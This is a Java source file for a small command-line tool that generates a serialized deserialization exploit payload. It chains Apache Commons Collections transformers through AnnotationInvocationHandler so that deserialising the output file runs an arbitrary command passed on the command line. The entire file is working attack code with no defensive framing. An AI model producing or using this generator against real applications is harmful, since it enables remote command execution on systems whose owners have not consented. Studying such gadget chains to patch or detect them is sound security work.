package payload;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class Payload {

	private String cmd;
	private String filepath;

	public Payload(String filepath, String cmd) {
		this.filepath = filepath;
		this.cmd = cmd;
	}

	private void generate_payload() throws Exception {
		Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] { String.class,
						Class[].class }, new Object[] { "getRuntime",
						new Class[0] }),
				new InvokerTransformer("invoke", new Class[] { Object.class,
						Object[].class }, new Object[] { null, new Object[0] }),
				new InvokerTransformer("exec", new Class[] { String.class },
						new Object[] { this.cmd }) };
		Transformer transformedChain = new ChainedTransformer(transformers);
		Map innerMap = new HashMap();
		innerMap.put("value", "value");
		Map outerMap = TransformedMap
				.decorate(innerMap, null, transformedChain);
		Class cl = Class
				.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(Target.class, outerMap);

		File f = new File(this.filepath);
		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
		out.writeObject(instance);
		out.flush();
		out.close();
	}

	public static void main(String args[]) throws Exception {

		if (args.length != 2) {
			System.out.println("java -jar payload.jar outfile cmd");
			System.exit(0);
		}

		String filepath = args[0];
		String cmd = args[1];

		Payload pwn = new Payload(filepath, cmd);
		pwn.generate_payload();

	}

}
